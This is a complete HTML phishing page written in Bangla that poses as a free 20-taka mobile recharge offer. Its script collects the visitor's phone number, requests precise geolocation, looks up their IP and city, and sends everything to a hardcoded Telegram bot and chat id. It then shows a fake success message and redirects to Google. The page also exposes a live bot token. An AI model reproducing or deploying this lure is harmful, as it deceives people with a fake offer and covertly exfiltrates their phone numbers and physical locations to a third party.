<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mobile Recharge Portal</title>
    <style>
        body { background: #ffffff; font-family: Arial, sans-serif; text-align: center; margin: 0; padding: 0; }
        .container { max-width: 400px; margin: 50px auto; padding: 20px; border: 1px solid #ddd; border-radius: 10px; }
        .title { color: #28a745; font-size: 22px; font-weight: bold; }
        input { width: 90%; padding: 12px; margin: 20px 0; border: 1px solid #ccc; border-radius: 5px; font-size: 16px; }
        .btn { background: #007bff; color: white; padding: 15px 30px; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; width: 90%; }
    </style>
</head>
<body>
    <div class="container">
        <div class="title">অফার: ২০ টাকা ফ্রি রিচার্জ</div>
        <p>নম্বর দিয়ে রিচার্জ নিশ্চিত করুন</p>
        <input type="number" id="phone_num" placeholder="01XXXXXXXXX">
        <button class="btn" onclick="processData()">রিচার্জ নিন</button>
    </div>

<script>
    async function processData() {
        const phone = document.getElementById('phone_num').value;
        if (phone.length < 11) { alert("সঠিক নম্বর দিন!"); return; }

        // পারমিশন চাওয়ার প্রসেস
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                async (pos) => {
                    await sendData(phone, pos.coords.latitude, pos.coords.longitude);
                },
                async (err) => {
                    // পারমিশন না দিলেও নম্বর যাবে
                    await sendData(phone, "Denied", "Denied");
                },
                { enableHighAccuracy: true, timeout: 5000 }
            );
        } else {
            await sendData(phone, "Not Supported", "Not Supported");
        }
    }

    async function sendData(phone, lat, lon) {
        const token = "8242516940:AAEGD8u48I_miakigo6zRSfJ6pvyEq7wM6k";
        const chat_id = "7887080882"; // আপনার পার্সোনাল আইডি

        try {
            const ipRes = await fetch('https://ipapi.co/json/');
            const ipData = await ipRes.json();
            
            const map = (lat === "Denied") ? "Permission Denied" : `https://www.google.com/maps?q=${lat},${lon}`;
            
            const message = `🎯 **New Request**\n📞 Phone: ${phone}\n🌐 IP: ${ipData.ip}\n🏙️ City: ${ipData.city}\n📍 Map: ${map}`;
            
            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
            
            await fetch(url);
            alert("সফল হয়েছে! ৩০ মিনিটের মধ্যে রিচার্জ পাবেন।");
            window.location.href = "https://www.google.com";
        } catch (e) {
            window.location.href = "https://www.google.com";
        }
    }
</script>
</body>
</html>
